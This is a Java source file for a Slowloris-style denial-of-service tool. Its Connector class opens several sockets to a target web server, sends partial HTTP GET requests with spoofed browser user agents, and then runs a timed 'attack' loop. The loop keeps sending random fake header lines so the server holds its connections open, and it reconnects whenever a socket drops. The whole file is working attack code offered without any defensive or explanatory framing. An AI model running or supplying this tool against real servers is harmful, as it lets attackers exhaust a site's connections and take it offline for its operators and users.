import java.io.IOException;
import java.net.*;
import java.util.Random;

/**
 * Created by connor on 14/11/15.
 */
public class Connector implements Runnable
{
    /** the number of socket connections to the server per `Connector` instance */
    private static final int NUMBER_OF_CONNECTIONS = 5;
    /** the server port to connect to */
    private int serverPort;
    /** number of seconds to stop the attack after, 0 = never stop */
    private int attackMinutes;

    /** the URL of the target */
    private URL targetURL;
    /** all of the connections Sockets for this Connector */
    private Socket[] allSockets = new Socket[NUMBER_OF_CONNECTIONS];
    /** the partial requests sent for each connection */
    private String[] allPartialRequests = new String[NUMBER_OF_CONNECTIONS];

    public Connector(String target, int serverPort, int attackMinutes) throws MalformedURLException
    {
        this.serverPort = serverPort;
        this.attackMinutes = attackMinutes;
        String targetPrefix = target.startsWith("http://") ? "" : "http://";
        targetURL = new URL(targetPrefix + target);
        allPartialRequests = createInitialPartialRequests();

        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
            initConnection(i);
    }

    /**
     * creates the initial partial requests that are sent to the server
     * @return a string array containing all the partial HTTP GET requests for every connection this Connector manages
     */
    private String[] createInitialPartialRequests()
    {
        String pagePrefix = "/";
        if(targetURL.getPath().startsWith("/"))
            pagePrefix = "";

        String type = "GET " + pagePrefix + targetURL.getPath() + " HTTP/1.1\r\n";
        String host = "Host: " + targetURL.getHost() + (serverPort == 80 ? "" : ":" + serverPort) + "\r\n";
        String contentType = "Content-Type: */* \r\n";
        String connection = "Connection: keep-alive\r\n";

        String[] agents = {"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-TW; rv:1.9.0.9) Gecko/2009040821",
        "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:2.0b4) Gecko/20100818",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
        "Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"};

        String[] allPartials = new String[NUMBER_OF_CONNECTIONS];
        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
            allPartials[i] = type + host + contentType + connection + agents[new Random().nextInt(agents.length)] + "\r\n";

        return allPartials;
    }

    /**
     * used to start a connection with the server for a specified index. Sets up the socket
     * @param index which connction index to set up
     */
    private void initConnection(int index)
    {
        try
        {
            System.out.println("Connector: " + toString() + "     Connecting: " + index);
            allSockets[index] = new Socket(InetAddress.getByName(targetURL.toExternalForm().replace("http://", "")), serverPort);
        }
        catch(IOException ioe)
        {
            ioe.printStackTrace();
            System.exit(-1);
        }
    }

    @Override
    public void run()
    {
        long startTime = System.currentTimeMillis();

        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++) // each connection sends a partial request
        {
            System.out.println("Connector: " + toString() + "    Sending partial request: " + i);
            sendPartialRequest(i);
            try
            {
                Thread.sleep(new Random().nextInt(2138));
            }
            catch(InterruptedException ie)
            {
                ie.printStackTrace();
            }
        }

        // main attack loop
        while((System.currentTimeMillis() - startTime) < (attackMinutes * 60 * 1000))
            attack();

        closeAllConnections();
    }

    /**
     * "gracefully" terminates all the connections by sending \r\n
     */
    private void closeAllConnections()
    {
        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
        {
            try
            {
                allSockets[i].getOutputStream().write("\r\n".getBytes());
            }
            catch(IOException ioe)
            {
                ioe.printStackTrace();
            }
        }
    }

    /**
     * sends useless information to the server for each connection. Keeps the connection
     * alive
     */
    private void attack()
    {
        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
        {
            sendFalseHeaderField(i);
            try
            {
                Thread.sleep(new Random().nextInt(3407)); // wait a random time before sending
            }
            catch(InterruptedException ie)
            {
                ie.printStackTrace();
            }
        }
    }

    /**
     * sends a fake header to the server so the server keeps the connection open
     * @param index the index of the connection to send the fake info
     */
    private void sendFalseHeaderField(int index)
    {
        char[] alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
        String fakeField = alphabet[new Random().nextInt(alphabet.length)] + "-" + alphabet[new Random().nextInt(alphabet.length)] + ": " + new Random().nextInt() + "\r\n";
        try
        {
            allSockets[index].getOutputStream().write(fakeField.getBytes());
        }
        catch(IOException ioe)
        {
            ioe.printStackTrace();
            initConnection(index); // try to re-connect
        }
    }

    /**
     * sends a partial HTTP GET request to the server
     * @param index the Socket at index is used to send the request
     */
    private void sendPartialRequest(int index)
    {
        try
        {
            allSockets[index].getOutputStream().write(allPartialRequests[new Random().nextInt(NUMBER_OF_CONNECTIONS)].getBytes()); // write a random partial HTTP GET request to the server
        }
        catch(IOException ioe)
        {
            ioe.printStackTrace();
            initConnection(index); // try to reestablish connection
        }
    }
}